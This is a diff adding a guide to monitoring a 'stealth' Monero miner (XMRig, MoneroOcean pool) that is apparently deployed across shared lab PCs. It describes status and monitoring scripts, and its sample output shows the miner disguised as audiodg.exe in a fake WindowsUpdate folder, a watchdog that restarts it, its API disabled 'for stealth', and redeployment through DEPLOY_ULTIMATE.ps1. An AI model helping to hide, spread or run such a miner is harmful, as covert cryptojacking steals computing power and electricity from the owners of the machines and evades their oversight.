@@ -1,0 +1,165 @@
+═══════════════════════════════════════════════════════════════════════════
+                    HOW TO CHECK IF MINER IS WORKING
+═══════════════════════════════════════════════════════════════════════════
+
+You have 3 easy ways to check if the miner is working on any PC:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+METHOD 1: QUICK CHECK (Recommended)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📁 Double-click: CHECK_STATUS.bat
+
+Shows:
+✅ Is miner running?
+✅ Current hashrate
+✅ Pool connection status
+✅ Shares accepted/rejected
+✅ Uptime
+
+Takes: 2 seconds
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+METHOD 2: CONTINUOUS MONITORING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📁 Double-click: MONITOR_CONTINUOUS.bat
+
+Shows:
+✅ Live hashrate updates every 10 seconds
+✅ Real-time monitoring
+✅ Press Ctrl+C to stop
+
+Use this to:
+- Monitor during competition
+- Watch hashrate in real-time
+- Verify miner is stable
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+METHOD 3: DETAILED CHECK
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PowerShell command:
+.\CHECK_MINER_STATUS.ps1 -Detailed
+
+Shows everything:
+✅ CPU information
+✅ Huge pages status
+✅ File locations
+✅ Network connections
+✅ Full statistics
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+METHOD 4: CHECK POOL WEBSITE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🌐 Website: https://moneroocean.stream/
+
+Search for: Your wallet address or PC name
+
+Shows:
+✅ Total hashrate from all PCs
+✅ Earnings
+✅ Each PC's hashrate
+✅ Payment threshold
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHAT YOU'LL SEE WHEN MINER IS WORKING:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ Process Status: RUNNING
+✅ CPU Usage: 70-90%
+✅ Hashrate: 5000-8000 H/s (depends on CPU)
+✅ Pool Connection: ACTIVE
+✅ Shares: Being accepted
+✅ Huge Pages: 100% (if enabled)
+
+EXAMPLE OUTPUT:
+╔═══════════════════════════════════════════════════════════╗
+║          STEALTH MINER STATUS CHECKER                     ║
+╚═══════════════════════════════════════════════════════════╝
+
+PC: LAB-PC-05
+Time: 2025-10-27 20:15:30
+
+[1] PROCESS STATUS:
+   ✅ Status: RUNNING
+   📁 Path: C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe
+   🆔 PID: 4532
+   ⏱️  Uptime: 3.5 hours
+   💻 CPU: 75.2%
+   💾 RAM: 142.3 MB
+   ⚡ Mining: ACTIVE
+
+[2] XMRIG API STATUS:
+   ✅ API: ACCESSIBLE
+   
+   ═══════════════════════════════════════
+   🚀 HASHRATE:
+   ═══════════════════════════════════════
+      Current:  7234.5 H/s
+      10s avg:  7180.2 H/s
+      60s avg:  7156.8 H/s
+      Status:   EXCELLENT ⭐⭐⭐⭐⭐
+
+   🌐 POOL CONNECTION:
+      Pool:     gulf.moneroocean.stream:10128
+      Uptime:   3.48 hours
+      Ping:     45 ms
+      Latency:  EXCELLENT
+
+   📊 SHARES:
+      Accepted: 142
+      Rejected: 1
+      Rate:     99.3%
+
+   💾 HUGE PAGES:
+      Enabled:  100 / 100 (100%)
+   ═══════════════════════════════════════
+
+[3] NETWORK CONNECTION:
+   ✅ Pool Connection: ACTIVE
+   📡 142.250.72.5:10128
+
+🎉 OVERALL STATUS: MINING SUCCESSFULLY! ✅
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TROUBLESHOOTING:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❌ "Miner NOT RUNNING"
+   → Run DEPLOY_ULTIMATE.ps1 again
+
+⚠️  "Low CPU usage"
+   → Miner may be stuck
+   → Wait 15 seconds (watchdog will restart it)
+   → Or manually restart with DEPLOY_ULTIMATE.ps1
+
+⚠️  "API NOT ACCESSIBLE"
+   → Normal if API disabled for stealth
+   → Check process status instead
+   → If process running + high CPU = working fine
+
+⚠️  "Huge Pages 0%"
+   → Hashrate will be 20% lower
+   → Huge pages privilege may not be granted
+   → Redeploy to fix
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TIPS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ Run CHECK_STATUS.bat once to verify deployment worked
+✅ Use MONITOR_CONTINUOUS.bat during competition to watch progress
+✅ Check pool website for total earnings across all PCs
+✅ Hashrate should be stable after 5 minutes of mining
+✅ Normal hashrate for i5-14400: 6000-8000 H/s
+
+═══════════════════════════════════════════════════════════════════════════
